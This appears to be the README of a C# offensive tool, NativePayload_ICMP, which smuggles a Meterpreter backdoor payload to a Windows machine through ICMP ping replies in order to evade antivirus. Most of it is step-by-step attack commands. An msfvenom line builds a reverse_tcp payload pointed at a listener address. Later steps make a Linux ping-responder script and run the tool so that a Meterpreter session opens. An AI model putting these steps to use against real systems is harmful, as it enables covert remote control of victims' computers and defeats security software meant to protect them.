# NativePayload_ICMP
C# code Published by Damon Mohammadbagher

NativePayload_ICMP : transfer Backdoor Payloads by ICMPv4 Traffic and bypassing Anti-Viruses

Tested : Win7 SP1 and Win 2008 R2

step by step:

example step1 msfvenom --arch x86_64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.50 -f c > payload.txt

note: copy your msfvenom output payloads to 'Payload string' like 'fc4883e4f0e8cc00000415141505265'

example step2 c:\\> NativePayload_ICMP.exe null "Payload string" > script.sh

example step2 c:\\> NativePayload_ICMP.exe null fc4883e4f0e8cc00000415141505265 > script.sh

example step3 c:\\> NativePayload_ICMP.exe ipaddress (sending ICMPv4 traffic to this ipaddress by ping)

example step3 c:\\> NativePayload_ICMP.exe 192.168.1.50 

example step4 linux side ./script.sh  (run this script in PING Responder linux system).

note: after chmod also adding #!/bin/bash to script.sh file , you can run this script in PING Responder system.

note: you should run this script in your linux after step3 for Response to PING traffic from backdoor system

note: Backdoor system is win with NativePayload_ICMP.exe and ipaddress for example: 192.168.1.120

note: PING Responder system is linux with ./script.sh and ipaddress for example : 192.168.1.50

note: PING Responder system is also Meterpreter Listener by ipaddress : 192.168.1.50

<summary>

in this case after 1020 ping request and response you have Meterpreter Session by ICMPv4

Dumping Payloads by TTL from PING Response...

Meterpreter Payload is 510 bytes

510 * 2 = 1020

 0 ... 1019 = 1020 Request
 
</summary>

